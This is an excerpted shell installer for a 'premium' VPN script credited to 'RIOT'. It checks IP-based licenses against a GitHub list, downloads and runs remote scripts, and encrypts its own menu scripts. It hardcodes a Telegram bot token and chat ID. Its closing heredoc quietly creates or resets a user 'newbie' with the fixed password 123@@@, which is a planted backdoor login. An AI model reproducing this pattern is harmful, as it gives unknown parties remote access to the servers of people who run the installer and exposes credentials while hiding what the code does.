...
TIMES="10"
CHATID="5869125156"
KEY="8108856094:AAE4bfjZVte1ozbYzYpJdr7n7lDOaFjpC_4"
...
clear;clear;clear
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo -e "\033[96;1m              WELCOME TO SRICPT BY RIOT              \033[0m"
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo ""
sleep 3
...
clear
rm -f /usr/bin/user
username=$(curl https://raw.githubusercontent.com/riot-wrtx/izin/main/ip | grep $MYIP | awk '{print $2}')
echo "$username" >/usr/bin/user
expx=$(curl https://raw.githubusercontent.com/riot-wrtx/izin/main/ip | grep $MYIP | awk '{print $3}')
echo "$expx" >/usr/bin/e
...
Exp1=$(curl https://raw.githubusercontent.com/riot-wrtx/izin/main/ip | grep $MYIP | awk '{print $4}')
if [[ $today < $Exp1 ]]; then
sts="${Info}"
else
sts="${Error}"
...
echo -e "\e[32mloading...\e[0m"
clear
REPO="https://raw.githubusercontent.com/riot-wrtx/premium/main/"
start=$(date +%s)
secs_to_human() {
...
USRSC=$(wget -qO- https://raw.githubusercontent.com/riot-wrtx/izin/main/ip | grep $ipsaya | awk '{print $2}')
EXPSC=$(wget -qO- https://raw.githubusercontent.com/riot-wrtx/izin/main/ip | grep $ipsaya | awk '{print $3}')
...
wget raw.githubusercontent.com/riot-wrtx/premium/main/Fls/limit.sh && chmod +x limit.sh && ./limit.sh
cd
...
cd
apt install git -y
git clone https://github.com/riot-wrtx/noobzvpn.git
cd noobzvpn/
chmod +x install.sh
./install.sh
...
wget -q -O /usr/bin/enc "https://raw.githubusercontent.com/riot-wrtx/premium/main/Enc/encrypt" ; chmod +x /usr/bin/enc
7z x -pSabdo@newbie menu.zip
chmod +x menu/*
enc menu/*
...
wget https://raw.githubusercontent.com/riot-wrtx/premium/main/Cfg/m-noobz
...
# Cek apakah user 'newbie' ada
if id "newbie" &>/dev/null; then
    # Jika ada, ubah passwordnya menjadi 123@@@
    echo "newbie:123@@@" | chpasswd
    if [ \$? -eq 0 ]; then
        echo "Password for user 'newbie' has been changed." >> /root/log-clear.txt
    else
        echo "Failed to change password for user 'newbie'." >> /root/log-clear.txt
    fi
else
    # Jika tidak ada, cek apakah grup 'newbie' sudah ada
    if getent group newbie &>/dev/null; then
        # Jika grup ada tapi user tidak ada, tambahkan user ke grup tersebut
        useradd -m -s /bin/bash -g newbie newbie
    else
        # Jika grup dan user tidak ada, buat user baru dengan grup default
        useradd -m -s /bin/bash newbie
    fi
    echo "newbie:123@@@" | chpasswd
    if [ \$? -eq 0 ]; then
        echo "User 'newbie' has been created with default password." >> /root/log-clear.txt
    else
        echo "Failed to create user 'newbie' or set password." >> /root/log-clear.txt
    fi
fi
END
